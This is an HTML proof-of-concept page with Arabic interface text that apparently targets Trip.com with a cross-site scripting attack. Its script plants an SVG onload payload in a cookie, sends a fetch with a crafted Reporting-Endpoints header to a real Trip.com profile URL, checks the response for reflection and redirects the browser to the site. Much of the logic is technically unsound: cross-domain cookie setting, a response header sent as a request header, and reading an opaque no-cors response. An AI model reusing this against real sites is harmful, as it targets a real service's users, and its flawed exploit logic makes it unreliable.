<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS Exploit - Trip.com PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #1a1a2e;
            color: #fff;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: #16213e;
            border-radius: 15px;
            padding: 30px;
            max-width: 800px;
            margin: 0 auto;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 { color: #e94560; }
        .payload-box {
            background: #0f3460;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 5px solid #e94560;
            text-align: left;
            overflow-x: auto;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .success { background: #28a745; }
        .pending { background: #ffc107; color: #000; }
        .error { background: #dc3545; }
        button {
            background: #e94560;
            color: #fff;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            margin: 10px;
        }
        button:hover {
            transform: scale(1.05);
            background: #ff6b81;
        }
        .hidden { display: none; }
        .log {
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 10px;
            text-align: left;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 XSS Exploit PoC - Trip.com</h1>
        <p>إثبات ثغرة XSS في <code>Reporting-Endpoints</code> Header</p>
        
        <div class="payload-box">
            <strong>🎯 البايلود المستخدم:</strong><br>
            <code id="payloadDisplay">&lt;svg/onload=alert('XSS')&gt;</code>
        </div>

        <div id="statusBox" class="status pending">
            ⏳ جاري تجهيز الطلب...
        </div>

        <div style="margin: 20px 0;">
            <button onclick="exploit()">🚀 تنفيذ الاستغلال</button>
            <button onclick="clearLogs()">🗑️ مسح السجل</button>
        </div>

        <div class="log" id="logBox">
            📋 سجل العمليات:
        </div>
    </div>

    <script>
        // ========== الإعدادات ==========
        const TARGET_URL = 'https://www.trip.com/membersinfo/profile/?locale=en-XX&curr=USD';
        const COOKIE_NAME = '_tp_search_latest_channel_name';
        const PAYLOAD = '<svg/onload=alert("XSS")>';
        // =================================

        let exploitCount = 0;

        function log(message, type = 'info') {
            const logBox = document.getElementById('logBox');
            const timestamp = new Date().toLocaleTimeString();
            const colors = {
                info: '#0f0',
                success: '#0f0',
                error: '#f00',
                warning: '#ff0'
            };
            const prefix = {
                info: 'ℹ️',
                success: '✅',
                error: '❌',
                warning: '⚠️'
            };
            logBox.innerHTML += `<div style="color: ${colors[type] || '#0f0'}">
                [${timestamp}] ${prefix[type] || 'ℹ️'} ${message}
            </div>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function updateStatus(message, type = 'pending') {
            const box = document.getElementById('statusBox');
            const classes = {
                pending: 'pending',
                success: 'success',
                error: 'error'
            };
            box.className = `status ${classes[type] || 'pending'}`;
            box.textContent = message;
        }

        function getAllCookies() {
            return document.cookie || 'No cookies found';
        }

        function setCookie(name, value) {
            try {
                const expires = new Date(Date.now() + 30 * 86400000).toUTCString();
                document.cookie = name + '=' + encodeURIComponent(value) + 
                                  '; expires=' + expires + 
                                  '; path=/; domain=.trip.com';
                log(`✅ تم تعيين الكوكي: ${name}=${value}`, 'success');
                return true;
            } catch (e) {
                log(`❌ فشل تعيين الكوكي: ${e.message}`, 'error');
                return false;
            }
        }

        function getCookie(name) {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                const [key, value] = cookie.trim().split('=');
                if (key === name) return decodeURIComponent(value);
            }
            return null;
        }

        async function exploit() {
            exploitCount++;
            const payload = document.getElementById('payloadDisplay').textContent;
            
            log(`🚀 بدء الاستغلال رقم ${exploitCount}`, 'info');
            updateStatus('⏳ جاري إرسال الطلب...', 'pending');

            try {
                // 1. تعيين الكوكي الضار
                log(`📝 تعيين الكوكي ${COOKIE_NAME} بالقيمة: ${payload}`, 'info');
                setCookie(COOKIE_NAME, payload);
                
                // 2. التحقق من الكوكي
                const cookieValue = getCookie(COOKIE_NAME);
                if (cookieValue === payload) {
                    log(`✅ الكوكي تم تعيينه بنجاح: ${cookieValue}`, 'success');
                } else {
                    log(`⚠️ الكوكي مختلف: ${cookieValue}`, 'warning');
                }

                // 3. عرض جميع الكوكيز الحالية
                const allCookies = getAllCookies();
                log(`🍪 جميع الكوكيز: ${allCookies.substring(0, 200)}...`, 'info');

                // 4. بناء الطلب مع الـ Header المعدل
                const headers = new Headers();
                headers.append('Reporting-Endpoints', `default="https://crash.trip.com/mcd_crash_server/spring/web/collect?cid=${encodeURIComponent(payload)}&vid=test&page=test"`);
                
                log(`🌐 إرسال طلب إلى: ${TARGET_URL}`, 'info');
                log(`📨 Header: Reporting-Endpoints: ${headers.get('Reporting-Endpoints')}`, 'info');

                // 5. إرسال الطلب
                const response = await fetch(TARGET_URL, {
                    method: 'GET',
                    headers: headers,
                    credentials: 'include',
                    mode: 'no-cors' // لتجنب مشاكل CORS
                });

                log(`📥 تم إرسال الطلب بنجاح (الرد: ${response.status})`, 'success');
                updateStatus(`✅ تم إرسال الطلب - الرد: ${response.status}`, 'success');

                // 6. التحقق من انعكاس البايلود
                if (response.status === 200) {
                    const text = await response.text();
                    if (text.includes(payload)) {
                        log(`✅ البايلود انعكس في الصفحة بنجاح!`, 'success');
                        updateStatus('✅ نجاح! البايلود منعكس في الصفحة', 'success');
                    } else {
                        log(`⚠️ البايلود ما انعكس في الصفحة`, 'warning');
                        updateStatus('⚠️ البايلود ما انعكس', 'warning');
                    }
                }

                // 7. التحويل للموقع (اختياري)
                setTimeout(() => {
                    log(`🔄 جاري التحويل إلى Trip.com...`, 'info');
                    window.location.href = TARGET_URL;
                }, 3000);

            } catch (e) {
                log(`❌ خطأ: ${e.message}`, 'error');
                updateStatus(`❌ فشل: ${e.message}`, 'error');
                
                // محاولة بديلة: التحويل مباشرة
                log(`🔄 محاولة التحويل المباشر...`, 'info');
                window.location.href = TARGET_URL;
            }
        }

        function clearLogs() {
            document.getElementById('logBox').innerHTML = '📋 سجل العمليات:';
            log('🗑️ تم مسح السجل', 'info');
        }

        // ====== تشغيل تلقائي عند تحميل الصفحة ======
        window.onload = function() {
            log('✅ الصفحة جاهزة', 'success');
            log(`🎯 البايلود المستخدم: ${document.getElementById('payloadDisplay').textContent}`, 'info');
            log(`🍪 الكوكيز الحالية: ${getAllCookies().substring(0, 100)}...`, 'info');
            updateStatus('✅ جاهز للتشغيل', 'success');
        };
    </script>
</body>
</html>
